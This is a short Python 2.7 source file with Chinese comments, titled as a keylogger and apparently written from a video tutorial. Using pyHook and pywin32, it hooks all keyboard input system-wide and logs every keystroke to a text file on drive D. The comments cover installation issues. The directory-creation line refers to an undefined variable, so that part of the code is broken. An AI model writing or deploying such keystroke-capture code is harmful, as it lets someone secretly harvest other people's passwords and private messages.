# 这是个键盘记录器 (2013-7-2)

# 程序需要2个额外库: pywin32 和 pyHook
# pywin32   支持py3.x
# pyHook  不支持py3.x 支持py2.7

# 所以我们只用 Python2.7
# 记住: pywin32要安装32位版本的, 哪怕你是64位的机子也别安装64位版本的
# 我测试的时候安装64位的会报错. 说找不到 pywintypes 模块
# 安装32位的安装包则没有这个问题, 运行良好.


# ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- 
# 代码是根据教程写的, 但是有修改. 
# http://www.youtube.com/watch?v=8BiOPBsXh0g
# ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- ---- 




import pyHook, pythoncom, sys, logging, os
# pythoncom == pywin32, 这俩是一码子事儿


file_log = r'D:\python-keylogger\keylog.txt'
# 日志路径
# 我们希望如果文件夹和文件不存在的话就自动创建.


if not os.path.exists(os.path.dirname(file_log)):
    os.makedirs(d)
# [创建目录]


if not os.path.exists(file_log):
    open(file_log, 'w').close()
# [创建文件]





def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format="%(message)s")
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True



hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent
# 按键盘的时候调用这个函数

hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
    











